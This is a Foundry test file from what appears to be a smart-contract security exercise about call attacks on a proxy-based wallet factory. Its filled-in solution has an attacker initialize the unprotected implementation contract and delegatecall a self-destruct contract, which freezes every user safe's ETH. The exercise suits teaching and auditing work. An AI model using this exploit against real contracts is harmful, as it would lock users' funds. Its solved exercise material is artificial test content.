// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../../src/Utils/DummyERC20.sol";
import "../../src/18. Call Attacks-4/BlockSafe.sol";
import "../../src/18. Call Attacks-4/SelfDestruct.sol";
import "../../src/18. Call Attacks-4/BlockSafeFactory.sol";

contract TestCA4 is Test {
    /**
     * SETUP EXERCISE - DON'T CHANGE ANYTHING HERE
     */
    BlockSafe template;
    BlockSafeFactory factory;
    DummyERC20 token;

    address deployer = makeAddr("deployer");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");
    address attacker = makeAddr("attacker");

    BlockSafe blockSafe1;
    BlockSafe blockSafe2;
    BlockSafe blockSafe3;

    uint256 attackerInitialBalance;

    uint8 constant CALL_OPERATION = 1;
    uint8 constant DELEGATECALL_OPERATION = 2;

    function setUp() public {
        vm.startPrank(deployer);
        // Deploy ERC20 Token
        token = new DummyERC20("DummyERC20", "DToken", 1000 ether);

        // Deploy Template and Factory
        template = new BlockSafe();

        factory = new BlockSafeFactory(deployer, address(template));

        vm.stopPrank();

        address[] memory operators = new address[](1);

        // User1 creating CryptoKeepers
        vm.startPrank(user1);
        operators[0] = user1;
        bytes32 user1Salt = keccak256(abi.encodePacked(user1));
        blockSafe1 = BlockSafe(payable(factory.createBlockSafe(user1Salt, operators)));

        vm.stopPrank();

        // User2 creating CryptoKeepers
        vm.startPrank(user2);
        operators[0] = user2;
        bytes32 user2Salt = keccak256(abi.encodePacked(user2));
        blockSafe2 = BlockSafe(payable(factory.createBlockSafe(user2Salt, operators)));

        vm.stopPrank();

        // User3 creating CryptoKeepers
        vm.startPrank(user3);
        operators[0] = user3;
        bytes32 user3Salt = keccak256(abi.encodePacked(user3));
        blockSafe3 = BlockSafe(payable(factory.createBlockSafe(user3Salt, operators)));

        vm.stopPrank();

        // Users load their cryptoKeeper with some ETH
        vm.deal(user1, 10 ether);
        vm.prank(user1);
        (bool success,) = address(blockSafe1).call{value: 10 ether}("");

        vm.deal(user2, 10 ether);
        vm.prank(user2);
        (success,) = address(blockSafe2).call{value: 10 ether}("");
        assertTrue(success);

        vm.deal(user3, 10 ether);
        vm.prank(user3);
        (success,) = address(blockSafe3).call{value: 10 ether}("");
        assertTrue(success);

        // Block Safe operation works
        vm.prank(user1);
        blockSafe1.executeWithValue(user2, "0x", 1 ether);

        vm.prank(user2);
        blockSafe2.executeWithValue(user3, "0x", 1 ether);

        vm.prank(user3);
        blockSafe3.executeWithValue(user1, "0x", 1 ether);

        // Only operator can manage wallet
        // addOperator fails
        vm.prank(user2);
        vm.expectRevert("Not an operator");
        blockSafe1.addOperator(user2);

        // executeWithValue fails
        vm.prank(user2);
        vm.expectRevert("Not an operator");
        blockSafe1.executeWithValue(user2, "0x", 1 ether);

        // execute fails
        vm.prank(user2);
        vm.expectRevert("Not an operator");
        bytes memory tokenCallData = abi.encodeWithSignature("balanceOf(address)", deployer);
        blockSafe1.execute(address(token), tokenCallData, CALL_OPERATION);

        attackerInitialBalance = attacker.balance;
    }

    function testExploit() public {
        /**
         * CODE YOUR SOLUTION HERE
         */
        vm.startPrank(attacker);

        SelfDestruct selfDestructContract = new SelfDestruct();

        address[] memory operator = new address[](1);
        operator[0] = attacker;
        template.initialize(operator);

        template.execute(address(selfDestructContract), "", DELEGATECALL_OPERATION);

        vm.stopPrank();

        // Verify the exploit worked by checking that the template contract is destroyed
        // We can check this by trying to call a function and seeing if it reverts
        vm.prank(attacker);
        vm.expectRevert();
        template.initialize(operator);
    }

    function testSuccessConditions() public {
        // First run the exploit
        testExploit();
        /**
         * SUCCESS CONDITIONS
         */
        // All safes should be non functional and frozen
        // And we can't withdraw ETH from the safes
        uint256 safe1BalanceBefore = address(blockSafe1).balance;
        vm.prank(user1);
        (bool success1,) = address(blockSafe1).call(
            abi.encodeWithSignature("executeWithValue(address,bytes,uint256)", user1, "", 10 ether)
        );
        assertFalse(success1, "Safe1 should be frozen");
        assertEq(address(blockSafe1).balance, safe1BalanceBefore, "Safe1 balance should not change");

        uint256 safe2BalanceBefore = address(blockSafe2).balance;
        // Try to withdraw from safe2 - should fail because the implementation is destroyed
        vm.prank(user2);
        (bool success2,) = address(blockSafe2).call(
            abi.encodeWithSignature("executeWithValue(address,bytes,uint256)", user2, "", 10 ether)
        );
        assertFalse(success2, "Safe2 should be frozen");
        assertEq(address(blockSafe2).balance, safe2BalanceBefore, "Safe2 balance should not change");

        uint256 safe3BalanceBefore = address(blockSafe3).balance;

        // Try to withdraw from safe3 - should fail because the implementation is destroyed
        vm.prank(user3);
        (bool success3,) = address(blockSafe3).call(
            abi.encodeWithSignature("executeWithValue(address,bytes,uint256)", user3, "", 10 ether)
        );
        assertFalse(success3, "Safe3 should be frozen");
        assertEq(address(blockSafe3).balance, safe3BalanceBefore, "Safe3 balance should not change");
    }
}
